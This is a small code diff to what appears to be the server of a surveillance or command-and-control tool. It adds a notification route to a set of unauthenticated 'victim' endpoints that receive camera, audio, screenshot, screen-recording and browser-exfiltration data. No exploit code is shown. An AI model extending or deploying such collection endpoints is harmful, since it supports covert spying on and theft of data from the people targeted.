@@ -33,6 +33,8 @@ _VICTIM_PUBLIC_PATHS = {
     '/api/mobile/camera', '/api/mobile/background_data',
     '/api/mobile/screenshot', '/api/mobile/audio', '/api/mobile/screen_record',
     '/api/browser-exfil/receive', '/api/network/receive',
+    # P10.2: the desktop shell polls this cookie-less over loopback
+    '/api/notify/pending',
 }
 _VICTIM_PUBLIC_PREFIXES = ('/t/', '/assets/', '/c/')
 
